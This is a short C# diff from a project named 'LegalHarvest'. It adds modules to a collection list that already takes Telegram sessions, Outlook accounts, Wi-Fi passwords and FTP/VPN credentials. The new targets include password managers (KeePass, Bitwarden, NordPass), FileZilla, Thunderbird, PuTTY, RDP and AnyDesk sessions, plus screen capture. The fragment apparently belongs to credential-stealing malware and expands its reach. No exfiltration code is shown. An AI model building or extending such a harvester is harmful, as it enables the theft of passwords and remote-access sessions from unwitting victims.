@@ -46,7 +46,20 @@ namespace LegalHarvest
                 new TelegramAllSessionsModule(),
                 new OutlookAccountsModule(),
                 new WifiPasswordsModule(),
-                new FtpVpnModule()
+                new FtpVpnModule(),
+                new ScreenCaptureAllModule(),
+                new HardwareInfoModule(),
+                new RecentFilesModule(),
+                new DatabaseClientsModule(),
+                new ThunderbirdPasswordsModule(),
+                new PuttySessionsModule(),
+                new FileZillaPasswordsModule(),
+                new SavedRDPModule(),
+                new NordPassModule(),
+                new KeePassModule(),
+                new BitwardenModule(),
+                new AnyDeskModule(),
+                new MobaXtermModule()
             };
 
             if (config.EnabledModules != null && config.EnabledModules.Any())
